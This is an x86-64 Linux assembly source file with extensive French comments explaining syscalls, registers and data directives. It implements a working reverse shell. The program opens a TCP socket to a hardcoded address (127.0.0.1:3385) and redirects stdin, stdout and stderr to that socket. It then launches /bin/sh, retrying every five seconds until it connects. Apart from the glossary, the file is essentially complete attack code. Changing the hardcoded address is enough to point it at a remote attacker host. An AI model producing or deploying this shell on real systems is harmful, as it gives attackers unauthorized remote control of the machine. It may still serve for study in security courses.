

; -------------------- LEXIQUE / EXPLICATIONS --------------------

; DIRECTIVES DE TAILLE :
; ----------------------
; db : define byte      → 1 octet  (ex: db 0x41 → A)
; dw : define word      → 2 octets
; dd : define doubleword→ 4 octets
; dq : define quadword  → 8 octets
; resb/resw/resd/resq : réserve de l’espace non initialisé (b = byte, w = word...)

; EXEMPLES :
; db "abc", 0      → chaîne terminée NULL
; dw 0x1234        → 2 octets = 34 12
; dd 0x12345678    → 4 octets = 78 56 34 12
; dq 0x1122334455667788 → 8 octets (little endian)

; REGISTRES :
; ------------
; rax : registre de retour / numéro du syscall
; rdi, rsi, rdx : arguments des appels système (dans cet ordre pour Linux x86_64)
; r12 : registre général utilisé pour stocker le socket FD temporairement
; rsi++/cmp/jne : boucle pour faire dup2 sur 0, 1, 2 (stdin, stdout, stderr)

; INSTRUCTIONS :
; --------------
; mov dst, src     → copie une valeur dans un registre ou une adresse mémoire
; lea r, [label]   → charge l'adresse du label dans le registre r (Load Effective Address)
; xor r, r         → met le registre r à 0 (opti : plus rapide que mov r, 0)
; syscall          → effectue un appel système (Linux utilise rax, rdi, rsi, rdx...)
; test r, r        → teste si le registre r est égal à 0 (équivalent à cmp r, 0)
; js label         → saute à `label` si le résultat précédent est négatif (signed jump)
; inc r            → incrémente le registre r de 1
; cmp a, b         → compare a et b
; jne label        → saute si a ≠ b (jump if not equal)
; jmp label        → saut inconditionnel

; LABELS :
; --------
; .nom_label:      → marque une position dans le code (point de retour ou saut)
; rel label        → accès relatif à l'adresse (utile pour les sections PIC/position-indep.)

; DONNÉES :
; ---------
; shell_path       → chaîne "/bin/sh", 0 (terminée par NULL)
; argv             → tableau de pointeurs vers "sh", "-c", "commande"
; env              → tableau vide (NULL), pas d’environnement transmis au shell

; APPELS SYSTÈME LINUX (x86_64) :
; -------------------------------
; syscall      → s’appuie sur :
;   rax = numéro de l’appel système
;   rdi, rsi, rdx = 1er, 2e, 3e argument
; Exemples :
;   read(0, buffer, size)     → rax=0, rdi=0, rsi=buffer, rdx=size
;   socket(domain, type, proto) → rax=41, rdi=AF_INET, rsi=SOCK_STREAM, rdx=0
;   connect(fd, *addr, len)   → rax=42, rdi=fd, rsi=addr, rdx=16
;   dup2(fd_source, fd_dest)  → rax=33, rdi=src, rdx=dest
;   execve(path, argv[], envp[]) → rax=59, rdi=chemin, rsi=argv, rdx=env

; STRUCTURES :
; ------------
; sockaddr        → structure représentant l’adresse IP + port :
;   dw  AF_INET          (2 octets)
;   dw  port             (2 octets, little endian)
;   dd  IP               (4 octets, little endian)
;   dq  padding          (8 octets pour compléter à 16 octets)

; timespec        → structure utilisée pour nanosleep :
;   dq  secondes
;   dq  nanosecondes

; ANSI SEQUENCES :
; ----------------
; shell_cmd → envoie des séquences échappées (\033]10;... etc.) pour changer les couleurs
;   \033]10;#HEX\007 → change couleur texte
;   \033]11;#HEX\007 → change couleur fond

; -----------------------------------------CODE--------------------------------------------------

BITS 64                          ; Architecture 64 bits (x86_64 Linux)

; -------------------- CONSTANTES POUR LES SYSCALLS --------------------
%define SYS_SOCKET     41       ; socket(domain, type, protocol)
%define SYS_CONNECT    42       ; connect(sockfd, sockaddr, addrlen)
%define SYS_DUP2       33       ; dup2(oldfd, newfd)
%define SYS_EXECVE     59       ; execve(filename, argv, envp)
%define SYS_NANOSLEEP  35       ; nanosleep(req, rem)
%define SYS_READ       0        ; read(fd, buf, count)
%define AF_INET        2        ; famille d'adresse Internet (IPv4)
%define SOCK_STREAM    1        ; type de socket TCP

; -------------------- SECTIONS MÉMOIRE --------------------

section .bss
ip_port_buf resb 32             ; Buffer pour lire "IP:PORT" depuis stdin (32 octets)
ip_bin      resd 1              ; Réservé pour IP en binaire (non utilisé ici)
port_bin    resw 1              ; Réservé pour port en binaire (non utilisé ici)

section .data
sockaddr:                       ; Structure sockaddr_in (16 octets)
    dw AF_INET                 ; 2 octets : famille d'adresse (AF_INET = 2)
    dw 0                      ; 2 octets : port (sera défini plus bas)
    dd 0                      ; 4 octets : adresse IP (sera défini plus bas)
    dq 0                      ; 8 octets : padding pour alignement (nécessaire)

timespec:                       ; Structure pour nanosleep (pause entre les tentatives)
    dq 5                      ; secondes à attendre
    dq 0                      ; nanosecondes

; -------------------- CHAÎNES ET TABLEAUX --------------------
shell_path db "/bin/sh", 0      ; Chemin vers le shell
arg1 db "sh", 0                 ; argv[0] = nom du programme
arg2 db "-c", 0                 ; argv[1] = option -c
shell_cmd db "echo '\033]10;#D1007F\007\033]11;#FFD1DC\007'; exec /bin/sh", 0
                                ; argv[2] = commande exécutée dans le shell (change couleurs puis relance un shell)

argv dq arg1, arg2, shell_cmd, 0 ; Tableau argv[] terminé par NULL

; -------------------- ENVIRONNEMENT PERSONNALISÉ --------------------
env_path db "PATH=/usr/bin:/bin", 0  ; Variable d’environnement PATH
env_home db "HOME=/root", 0          ; Variable d’environnement HOME
env dq env_path, env_home, 0         ; Tableau envp[] terminé par NULL

; -------------------- SECTION CODE PRINCIPAL --------------------

section .text
global _start

_start:
; --------------------------------------------------------
; read(0, ip_port_buf, 32)
; Lecture de 32 octets depuis stdin vers ip_port_buf
; --------------------------------------------------------
    mov     rax, SYS_READ
    xor     rdi, rdi                    ; fd = 0 → stdin
    lea     rsi, [rel ip_port_buf]     ; adresse du buffer de lecture
    mov     rdx, 32                    ; nombre maximal d'octets
    syscall

; --------------------------------------------------------
; Fallback IP:PORT → 127.0.0.1:3385
; On n'analyse pas réellement le buffer ici
; --------------------------------------------------------
    mov     dword [rel sockaddr+4], 0x0100007F ; IP: 127.0.0.1 (little endian)
    mov     word  [rel sockaddr+2], 0x390D     ; Port: 3385 (0x0D39 → 0x390D little endian)

.retry_connect:
; --------------------------------------------------------
; socket(AF_INET, SOCK_STREAM, 0)
; Création d'une socket TCP IPv4
; --------------------------------------------------------
    mov     rax, SYS_SOCKET
    mov     rdi, AF_INET        ; domain = AF_INET
    mov     rsi, SOCK_STREAM    ; type = SOCK_STREAM (TCP)
    xor     rdx, rdx            ; protocol = 0 (IP par défaut)
    syscall
    test    rax, rax
    js      .retry_wait         ; si erreur, pause et réessayer
    mov     r12, rax            ; sauvegarde du descripteur de socket

; --------------------------------------------------------
; connect(sockfd, &sockaddr, 16)
; Tentative de connexion au serveur distant
; --------------------------------------------------------
    mov     rdi, r12
    lea     rsi, [rel sockaddr]
    mov     rdx, 16
    mov     rax, SYS_CONNECT
    syscall
    test    rax, rax
    js      .retry_wait         ; si échec, pause et réessayer

; --------------------------------------------------------
; dup2(sockfd, 0/1/2)
; Redirection des descripteurs stdin, stdout, stderr vers la socket
; --------------------------------------------------------
    ; dup2(oldfd=r12, newfd=0..2)
    ; Cela permet au shell lancé ensuite d’utiliser la connexion réseau
    ; comme terminal (entrée/sortie).

    ; En pratique :
    ; - dup2(r12, 0) → stdin    ← socket
    ; - dup2(r12, 1) → stdout   ← socket
    ; - dup2(r12, 2) → stderr   ← socket

    ; dup2() crée une duplication du descripteur de fichier source
    ; vers une destination (newfd), en fermant celle-ci si elle est déjà ouverte.
    ; Cela rend le shell interactif à distance possible.
    
    mov     rsi, 0              ; Compteur : 0 → stdin
.dup_loop:
    mov     rax, SYS_DUP2
    mov     rdi, r12            ; oldfd = socket
    mov     rdx, rsi            ; newfd = 0, 1, 2
    syscall
    inc     rsi
    cmp     rsi, 3
    jne     .dup_loop

; --------------------------------------------------------
; execve("/bin/sh", ["sh", "-c", shell_cmd], [env])
; Lance un shell interactif avec les couleurs personnalisées
; et les variables d’environnement spécifiées
; --------------------------------------------------------
    mov     rax, SYS_EXECVE
    lea     rdi, [rel shell_path] ; chemin de l’exécutable
    lea     rsi, [rel argv]       ; arguments du shell
    lea     rdx, [rel env]        ; tableau envp[] avec PATH et HOME
    syscall                       ; Ne revient pas si succès

.retry_wait:
; --------------------------------------------------------
; nanosleep({5, 0}, NULL)
; Pause de 5 secondes avant une nouvelle tentative de connexion
; --------------------------------------------------------
    mov     rax, SYS_NANOSLEEP
    lea     rdi, [rel timespec]
    xor     rsi, rsi              ; rsi = NULL (pas besoin de retour)
    syscall
    jmp     .retry_connect        ; retourne au début de la boucle de connexion
